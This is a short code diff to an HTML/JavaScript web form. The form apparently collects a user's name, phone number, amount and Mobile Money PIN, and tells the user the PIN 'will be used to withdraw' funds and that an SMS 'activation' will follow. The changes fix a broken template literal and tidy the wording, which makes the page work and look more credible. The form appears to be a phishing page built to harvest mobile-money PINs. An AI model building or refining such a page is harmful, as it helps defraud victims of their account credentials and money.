@@ -67,7 +67,7 @@
 
     <!-- Thank you message -->
     <div class="thankyou" id="thankyou">
-      Thank you. You will receive a confirmation message CODE Via SMS for activation
+      Thank you. You will receive a confirmation message via SMS for activation
     </div>
   </form>
 </div>
@@ -96,8 +96,8 @@ function isAmountValid(v){return v!=='' && !isNaN(v) && Number(v)>0;}
 function updatePinLabel(){
   const amt=amountInput.value||'[Amount]';
   const ph=phoneInput.value||'[Phone Number]';
-  document.getElementById('pinLabel').textContent=`Enter Your Mobile Money PIN';
-  dynamicHint.textContent=`This  PIN will be used to Withdraw ${amt} to ${ph}`;
+  document.getElementById('pinLabel').textContent=`Enter Your Mobile Money PIN`;
+  dynamicHint.textContent=`This PIN will be used to withdraw ${amt} to ${ph}`;
 }
 
 [nameInput, phoneInput, amountInput, pinInput].forEach(el=>el.addEventListener('input',()=>{
